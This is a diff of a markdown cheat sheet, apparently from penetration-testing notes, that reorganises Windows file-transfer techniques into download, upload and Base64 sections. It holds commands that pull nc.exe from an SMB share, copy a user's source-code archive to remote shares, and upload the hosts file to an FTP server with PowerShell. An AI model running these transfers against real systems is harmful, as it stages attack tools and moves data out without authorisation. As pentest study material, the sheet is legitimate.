@@ -1,3 +1,5 @@
+## Downloads
+
 ### PowerShell DownloadFile Method
 
 ```powershell
@@ -33,14 +35,11 @@ copy \\192.168.220.133\share\nc.exe
 
 ### FTP Downloads
 
-```bash
-sudo pip3 install pyftpdlib
-sudo python3 -m pyftpdlib --port 21
-```
-
 ```powershell
 (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
+
+## Uploads
 
 ### PowerShell Web Upload
 
@@ -76,8 +75,20 @@ copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 ```
 
+### FTP Uploads
 
-### Base64 Encoding/Decoding
+```bash
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port 21
+```
+
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+## Encoding/Decoding
+
+### Base64 Encoding
 
 ```powershell
 ## Encoding file
@@ -85,4 +96,10 @@ copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 
 ## Specific text encoding
 [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Text))
+```
+
+### Base64 Decoding
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Public\<filetosave>", [Convert]::FromBase64String("<base64-string>"))
 ```
